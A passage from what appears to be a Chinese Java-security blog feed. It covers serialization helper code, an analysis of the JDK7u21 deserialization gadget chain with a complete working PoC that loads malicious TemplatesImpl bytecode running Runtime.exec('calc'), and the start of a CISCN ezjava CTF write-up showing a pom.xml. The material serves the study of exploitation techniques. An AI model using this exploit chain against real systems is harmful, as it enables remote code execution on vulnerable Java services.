FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调试可发现此时就一个getOutputProperties,无差别调用<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240503173630.png" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://xz.aliyun.com/t/12966">https://xz.aliyun.com/t/12966</a></li>
<li><a href="https://xz.aliyun.com/t/12485">https://xz.aliyun.com/t/12485</a></li>
<li><a href="https://xz.aliyun.com/t/12846">https://xz.aliyun.com/t/12846</a></li>
<li><a href="https://xz.aliyun.com/t/7096">https://xz.aliyun.com/t/7096</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Jdk7u21链子分析</title>
    <url>/2024/05/17/jdk7u21/</url>
    <content><![CDATA[<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>前置知识是TemplatesImpl类加载字节码RCE,也是sink点<br>TemplatesImpl类的<code>newTransformer</code>方法会调用<code>getTransletInstance</code>方法 ,然后先通过<code>defineTransletClasses</code>方法填充<code>__class__</code>,然后调用<code>x].newInstance()</code>RCE</p>
<p>这里需要找到一个类调用<code>TemplatesImpl</code>的newTransformer方法<br>这里我们找到的是<code>AnnotationInvocationHandler</code>的<code>equalsImpl</code>方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240517134251.png" alt="image.png"><br>这里可以调用var1类的var5方法<br>var5是var2来的,var2是getMemberMethods()方法获取的<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240517134356.png" alt="image.png"><br>可以看到memberMethods是通过<code>this.type</code>获取的.,这个值构造函数我们是可控的,我们可以控制它是Templates类,它只有<code>newTransformer</code>和<code>getOutputProperties</code>方法</p>
<p>而equalsImpl方法是通过AnnotationInvocation类的invoke方法调用的<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240517134731.png" alt="image.png"><br>进入if语句需要满足几个条件:</p>
<ol>
<li>代理的方法名是”equals”</li>
<li>这个代理方法的参数只有1个</li>
<li>参数类型是Object类型</li>
</ol>
<p>这里我们使用的是Hashmap的put()方法当产生哈希冲突时会调用<code>key.equals(k)</code></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240517135042.png" alt="image.png"></p>
<p>我们需要存入两个key,保证它们的hash值相等,indexFor计算的i相等,两个key值不相等,上一个key要是TemplatesImpl对象,这次的key是代理的AnnotationInvocation类<br>如图:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240517135549.png" alt="image.png"></p>
<p>此时才可连上链子</p>
<h3 id="怎么保证两次的hash值相同的"><a href="#怎么保证两次的hash值相同的" class="headerlink" title="怎么保证两次的hash值相同的?"></a>怎么保证两次的hash值相同的?</h3><p>查看HashMap的hash方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240517135741.png" alt="image.png"><br>发现有个k.hashCode()方法<br>这个k是TemplatesImpl对象或者代理类<br>代理类的invoke方法检测方法名,如果是hashCode()方法就调用hashCodeImpl()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240517140609.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    Map.Entry var3;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">        var3 = (Map.Entry)var2.next();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里var2遍历我们传入的memberValues,var3做一次for循环就被赋值了那个HashMap对象<br><code>var3.getKey()).hashCode()</code>计算我们传入的字符串的hashCode()方法,而<code>f5a5a608</code>经过String.hashCode()方法处理完结果是0<br>而0与任何值异或都是对方<br>主要看<code>memberValueHashCode(var3.getValue())</code>,而TemplatesImpl没有hashCode()方法<br>而我们第一次set.add(templates);传入的templates和第二次一样的,因此hash相同,具体看Poc代码</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: H3rmesk1t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/3/10 8:16 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">study1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">generateEvilTemplates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成恶意的 bytecodes</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractMethodError.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;JDK7u21Exploit&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">byte</span>[] ctClassBytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;ctClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化类并设置属性</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  templatesImpl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> generateEvilTemplates();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(<span class="string">&quot;f5a5a608&quot;</span>, <span class="string">&quot;zero&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handlerConstructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 为tempHandler创造一层代理</span></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(study1.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);</span><br><span class="line">        <span class="comment">// 实例化HashSet，并将两个对象放进去</span></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将恶意templates设置到map中</span></span><br><span class="line">        hashMap.put(<span class="string">&quot;f5a5a608&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(set);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">        System.out.println(object);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            exp();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/articles/web/327709.html">https://www.freebuf.com/articles/web/327709.html</a></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 CISCN ezjava复现总结</title>
    <url>/2024/05/24/2024ciscn%20ezjava%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="mysql写文件到classpath-行不通"><a href="#mysql写文件到classpath-行不通" class="headerlink" title="mysql写文件到classpath(行不通)"></a>mysql写文件到classpath(行不通)</h2><p>首先看pom.xml<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jdbcTest<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>jdbcTest<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>jdbcTest<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring-boot.version</span>&gt;</span>2.3.3.RELEASE<span class="tag">&lt;/<span class="name">spring-boot.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xerial<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sqlite-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.clickhouse<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>clickhouse-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.3.2-patch11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.jupiter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-jupiter-params<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.postgresql/postgresql --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.amazon.redshift<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>redshift-jdbc42<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/oracle.jdbc.oracledriver/ojdbc6 --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring-boot.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.3.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>repackage<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span 